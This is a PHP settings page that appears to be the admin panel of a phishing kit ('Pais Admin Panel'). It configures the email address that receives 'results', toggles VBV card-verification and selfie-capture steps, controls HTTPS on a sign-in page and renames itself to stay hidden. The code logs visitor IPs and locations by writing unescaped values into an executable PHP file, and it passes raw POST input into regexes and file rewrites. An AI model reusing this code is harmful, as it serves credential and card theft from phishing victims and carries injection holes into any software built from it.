<?php
include('../settings.php');
include_once '../detect.php';
include_once '../detect_os.php';

date_default_timezone_set("Asia/Bangkok");
$uriSegments = explode("/", parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH));
$lastUriSegment = array_pop($uriSegments);

$dt = date("l, F j Y h:i:s A");
$dt1 = strtotime(date("Y-m-d H:i:s"));

$msg = "<?php ".'$start = '.'"'.$dt1.'"; '." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'."; ".' '." echo '<font color=blue>PANEL</font> > ".$ip.", ".$user_browser.", ".$user_os.", ".$nama_negara.", ".$kota.", ".date('Y-m-d').", <font color=red>'; ".' echo round(abs($end - $start) / 60,0). " minute ago </font><br/>"; ?>'."
";

$file=fopen("../visitor_log.php","a");
fwrite($file, $msg);
fclose($file);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!-- Meta, title, CSS, favicons, etc. -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Pais Admin Panel V 0.1 | Settings</title>

    <!-- Bootstrap -->
    <link href="assets/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <!-- NProgress -->
    <link href="assets/nprogress/nprogress.css" rel="stylesheet">
    <!-- iCheck -->
    <link href="assets/iCheck/skins/flat/green.css" rel="stylesheet">

    <!-- bootstrap-progressbar -->
    <link href="assets/bootstrap-progressbar/css/bootstrap-progressbar-3.3.4.min.css" rel="stylesheet">
    <!-- JQVMap -->
    <link href="assets/jqvmap/dist/jqvmap.min.css" rel="stylesheet"/>
    <!-- bootstrap-daterangepicker -->
    <link href="assets/bootstrap-daterangepicker/daterangepicker.css" rel="stylesheet">

    <!-- Custom Theme Style -->
    <link href="build/css/custom.min.css" rel="stylesheet">
  </head>

  <body class="nav-md">
    <div class="container body">
      <div class="main_container">
        <div class="col-md-3 left_col">
          <div class="left_col scroll-view">
            <div class="navbar nav_title" style="border: 0;">
            </div>

            <div class="clearfix"></div>

            <!-- menu profile quick info -->
            <div class="profile clearfix">
              <div class="profile_pic">
                <img src="images/img.png" alt="..." class="img-circle profile_img">
              </div>
              <div class="profile_info">
                <span>Welcome,</span>
                <h2>User xd</h2>
              </div>
            </div>
            <!-- /menu profile quick info -->

            <br />

            <!-- sidebar menu -->
            <div id="sidebar-menu" class="main_menu_side hidden-print main_menu">
              <div class="menu_section">
                <h3>Management</h3>
                <ul class="nav side-menu">
                  <li><a href="dashboard.php"><i class="fa fa-home"></i>Dashboard</a></li>
                  <li><a href="setting.php"><i class="fa fa-users"></i>Settings</a></li>
                </ul>
              </div>
            </div>
            <div class="sidebar-footer hidden-small">
              <a data-toggle="tooltip" data-placement="top" title="Logout">
                <span class="glyphicon glyphicon-off" aria-hidden="true"></span>
              </a>
              <a data-toggle="tooltip" data-placement="top">
                <span class="glyphicon" aria-hidden="true"></span>
              </a>
              <a data-toggle="tooltip" data-placement="top">
                <span class="glyphicon" aria-hidden="true"></span>
              </a>
              <a data-toggle="tooltip" data-placement="top">
                <span class="glyphicon" aria-hidden="true"></span>
              </a>
            </div>
            <!-- /menu footer buttons -->
          </div>
        </div>

        <!-- top navigation -->
        <div class="top_nav">
          <div class="nav_menu">
            <nav>
              <div class="nav toggle">
                <a id="menu_toggle"><i class="fa fa-bars"></i></a>
              </div>

              <ul class="nav navbar-nav navbar-right">
                <li class="">
                  <a href="javascript:;" class="user-profile dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                    <img src="images/img.png" alt="">
                  </a>
                </li>
              </ul>
            </nav>
          </div>
        </div>
        <!-- /top navigation -->

        <!-- page content -->
        <div class="right_col" role="main">
          <!-- top tiles -->
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="x_panel">
                <div class="x_title">
                  <h2>Settings Options</small></h2>
                  <ul class="nav navbar-right panel_toolbox">
                    <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                    </li>
                    <li><a class="close-link"><i class="fa fa-close"></i></a>
                    </li>
                  </ul>
                  <div class="clearfix"></div>
                </div>
                <div class="x_content">
                 <table width="90%" align="center">
    <tr>
      <td width="45" align="center"><h5><strong>Get Result</strong></h5></td>
    </tr>
  </table>
  <table align="center" width="90%" border="1">
    <tr>
      <td width="50%">
        <table align="center">
          <tr>
            <td align="center">Now</td>
            <td align="center">New</td>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="30" name="txt_oldemail" value="<?php echo $pais_email; ?>" required=required readonly="">
              </td>
              <td align="center">
                <input type="text" class="form-control-sm" size="30" name="txt_newemail" value"" placeholder="yourmail@domain.com" required=required>
              </td>
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_email" value="Change Email">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_oldpassword" value="<?php echo $pais_minpass; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_newpassword" placeholder="New" value="" required=required>
              </td>
              <td colspan="2" align="center">
                <input type="submit" class="btn btn-info btn-sm" name="change_password" value="Change Password">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_oldpanel" value="<?php echo $lastUriSegment; ?>" required="required" readonly="">
                <input type="hidden" class="form-control-sm" size="15" name="txt_oldpanelphp" value="<?php echo $lastUriSegment. ".php"; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_newpanel" id="txt_newpanel" maxlength="8" placeholder="New Key" value="" required=required>
              </td>
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_panel" id="id_change_panel" value="Change Panel">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_oldlang" value="<?php echo $pais_multilang; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select class="form-control-sm" name="txt_newlang">
                  <option value="lang_active" <?= $pais_multilang != 'lang_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="lang_nonactive" <?= $pais_multilang != 'lang_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_lang" id="id_change_lang" value="Change Language">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_oldselfie" value="<?php echo $pais_selfie; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select class="form-control-sm" name="txt_newselfie">
                  <option value="selfie_active" <?= $pais_selfie != 'selfie_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="selfie_nonactive" <?= $pais_selfie != 'selfie_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_selfie" id="id_change_selfie" value="Change Selfie">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="15" name="txt_oldvbv" value="<?php echo $pais_vbv; ?>" required="required" readonly="">
              </td>
              <td align="center">
                <select class="form-control-sm" name="txt_newvbv">
                  <option value="vbv_active" <?= $pais_vbv != 'vbv_active' ? "selected=''" : "" ?>>Active</option>
                  <option value="vbv_nonactive" <?= $pais_vbv != 'vbv_nonactive' ? "selected=''" : "" ?>>Non Active</option>
                </select>
              </td>
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_vbv" id="id_change_vbv" value="Change VBV">
              </td>
            </form>
          </tr>
          <tr>
            <form method="POST">
              <td align="center">
                <input type="text" class="form-control-sm" size="30" name="txt_oldaccess" value="<?php echo $pais_access; ?>" required=required readonly="">
              </td>
              <td align="center">
                <input type="text" class="form-control-sm" size="30" name="txt_newaccess" value"" placeholder="123456" required=required>
              </td>
              <td align="center" colspan="2">
                <input type="submit" class="btn btn-info btn-sm" name="change_access" value="Change Access">
              </td>
            </form>
          </tr>
<?php
@unlink("set.php");

$oldemail   = trim(@$_POST['txt_oldemail']);
$newemail   = trim(@$_POST['txt_newemail']);
$oldpassword   = trim(@$_POST['txt_oldpassword']);
$newpassword   = trim(@$_POST['txt_newpassword']);
$oldpanel   = trim(@$_POST['txt_oldpanel']);
$newpanel   = trim(@$_POST['txt_newpanel']);
$oldpanelphp   = trim(@$_POST['txt_oldpanelphp']);
$oldlang   = trim(@$_POST['txt_oldlang']);
$newlang   = trim(@$_POST['txt_newlang']);
$oldselfie   = trim(@$_POST['txt_oldselfie']);
$newselfie   = trim(@$_POST['txt_newselfie']);
$oldvbv   = trim(@$_POST['txt_oldvbv']);
$newvbv   = trim(@$_POST['txt_newvbv']);
$oldaccess   = trim(@$_POST['txt_oldaccess']);
$newaccess   = trim(@$_POST['txt_newaccess']);
$file   = "../settings.php";
$isi    = @file_get_contents($file);

if(isset($_POST['change_email'])) {
  if(@preg_match("#\b$oldemail\b#is", $isi)) {
    $isi = str_replace($oldemail,$newemail,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_access'])) {
  if(@preg_match("#\b$oldaccess\b#is", $isi)) {
    $isi = str_replace($oldaccess,$newaccess,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_password'])) {
  if(@preg_match("#\b$oldpassword\b#is", $isi)) {
    $isi = str_replace($oldpassword,$newpassword,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_panel'])) {
  if(@preg_match("#\b$oldpassword\b#is", $isi)) {
    $oldpanelname = $oldpanelphp;
    $ext = strtolower(substr($oldpanelname, strripos($oldpanelname, '.')+1));

    $newpanelname = $newpanel.'.'.$ext;

    $fileAwal = $oldpanelname;
    $fileBaru = $newpanelname;
    rename($fileAwal, $fileBaru);

    echo "<script>alert('DONE PAIS PROTECT'); </script>";
    echo "<meta http-equiv='refresh' content='0; url=http://$_SERVER[HTTP_HOST]/PAIS/$newpanel'/>";
  }else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_lang'])) {
  if(@preg_match("#\b$oldlang\b#is", $isi)) {
    $isi = str_replace($oldlang,$newlang,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_selfie'])) {
  if(@preg_match("#\b$oldselfie\b#is", $isi)) {
    $isi = str_replace($oldselfie,$newselfie,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}

if(isset($_POST['change_vbv'])) {
  if(@preg_match("#\b$oldvbv\b#is", $isi)) {
    $isi = str_replace($oldvbv,$newvbv,$isi);
    $open = @fopen($file,'w');
    @fwrite($open,$isi);
    fclose($open);

    echo "<script>alert('DONE PAIS PROTECT'); location.reload(); </script>";
  }
  else{
    echo "<script>alert('Refresh Page CTRL+F5')</script>";
  }
}


if(isset($_POST['https_nonactive'])) {
  unlink('../signin/.htaccess');
}

if(isset($_POST['https_active'])) {
  $f = fopen("../signin/.htaccess", "a+");
  fwrite($f, "<IfModule mod_rewrite.c>
  RewriteEngine on
  RewriteCond %{HTTPS} !=on [NC]
  RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [R=301,L]
</IfModule> ");
  fclose($f);
}
?>

    <!-- jQuery -->
    <script src="assets/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap -->
    <script src="assets/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- FastClick -->
    <script src="assets/fastclick/lib/fastclick.js"></script>
    <!-- NProgress -->
    <script src="assets/nprogress/nprogress.js"></script>
    <!-- Chart.js -->
    <script src="assets/Chart.js/dist/Chart.min.js"></script>
    <!-- gauge.js -->
    <script src="assets/gauge.js/dist/gauge.min.js"></script>
    <!-- bootstrap-progressbar -->
    <script src="assets/bootstrap-progressbar/bootstrap-progressbar.min.js"></script>
    <!-- iCheck -->
    <script src="assets/iCheck/icheck.min.js"></script>
    <!-- Skycons -->
    <script src="assets/skycons/skycons.js"></script>
    <!-- Flot -->
    <script src="assets/Flot/jquery.flot.js"></script>
    <script src="assets/Flot/jquery.flot.pie.js"></script>
    <script src="assets/Flot/jquery.flot.time.js"></script>
    <script src="assets/Flot/jquery.flot.stack.js"></script>
    <script src="assets/Flot/jquery.flot.resize.js"></script>
    <!-- Flot plugins -->
    <script src="assets/flot.orderbars/js/jquery.flot.orderBars.js"></script>
    <script src="assets/flot-spline/js/jquery.flot.spline.min.js"></script>
    <script src="assets/flot.curvedlines/curvedLines.js"></script>
    <!-- DateJS -->
    <script src="assets/DateJS/build/date.js"></script>
    <!-- JQVMap -->
    <script src="assets/jqvmap/dist/jquery.vmap.js"></script>
    <script src="assets/jqvmap/dist/maps/jquery.vmap.world.js"></script>
    <script src="assets/jqvmap/examples/js/jquery.vmap.sampledata.js"></script>
    <!-- bootstrap-daterangepicker -->
    <script src="assets/moment/min/moment.min.js"></script>
    <script src="assets/bootstrap-daterangepicker/daterangepicker.js"></script>
    <!-- Datatables -->
    <script src="assets/datatables.net/js/jquery.dataTables.min.js"></script>
    <script src="assets/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
    <script src="assets/datatables.net-buttons/js/dataTables.buttons.min.js"></script>
    <script src="assets/datatables.net-buttons-bs/js/buttons.bootstrap.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.flash.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.html5.min.js"></script>
    <script src="assets/datatables.net-buttons/js/buttons.print.min.js"></script>
    <script src="assets/datatables.net-fixedheader/js/dataTables.fixedHeader.min.js"></script>
    <script src="assets/datatables.net-keytable/js/dataTables.keyTable.min.js"></script>
    <script src="assets/datatables.net-responsive/js/dataTables.responsive.min.js"></script>
    <script src="assets/datatables.net-responsive-bs/js/responsive.bootstrap.js"></script>
    <script src="assets/datatables.net-scroller/js/dataTables.scroller.min.js"></script>
    <script src="assets/jszip/dist/jszip.min.js"></script>
    <script src="assets/pdfmake/build/pdfmake.min.js"></script>
    <script src="assets/pdfmake/build/vfs_fonts.js"></script>
    <!-- Custom Theme Scripts -->
    <script src="build/js/custom.min.js"></script>
  </body>
</html>
